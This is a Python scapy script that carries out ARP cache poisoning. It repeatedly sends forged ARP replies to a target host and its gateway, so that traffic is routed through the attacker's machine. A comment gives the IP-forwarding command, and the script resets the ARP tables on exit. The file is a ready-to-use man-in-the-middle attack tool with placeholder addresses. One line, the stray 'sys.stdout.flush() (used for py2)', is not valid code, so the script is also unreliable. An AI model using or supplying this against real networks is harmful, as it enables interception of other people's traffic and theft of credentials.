#!/usr/bin/env python
import scapy.all as scapy
# import sys (used for py2)
from scapy.layers.l2 import *
from network_scanner import arpScan as getMac


# Need this cmd to be able to handle packets forwarded by the target machine and pass to gateway
# echo 1 > /proc/sys/net//ipv4/ip_forward

def craftSpoofResponse(targetIp, spoofedIp):
    targetMacAddress = getMac(targetIp)

    packet = ARP(op=2, pdst=targetIp, hwdst=targetMacAddress,
                 psrc=spoofedIp)  # this is a response packet defined at (op=2) sending arp spoof to target client and faking router IP
    scapy.send(packet, verbose=False)


def restore(destIp, srcIp):
    destMacAddress = getMac(destIp)
    srcMacAddress = getMac(srcIp)
    packet = ARP(op=2, pdst=destIp, hwdst=destMacAddress, psrc=srcIp, hwsrc=srcMacAddress)
    scapy.send(packet, count=4, verbose=False)


target_Ip = "<IP ADDRESS>"
gateway_Ip = "<IP ADDRESS>"
try:
    i = 2
    while True:
        craftSpoofResponse(target_Ip, gateway_Ip)
        craftSpoofResponse(gateway_Ip, target_Ip)
        # print("\r[+] sent 2 packets -- " + str(i) + " total packets have been sent", end="")  # ,(used for py2)
        sys.stdout.flush() (used for py2)
        i += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ....resetting ARP tables & exiting")
    restore(target_Ip, gateway_Ip)
    restore(gateway_Ip, target_Ip)
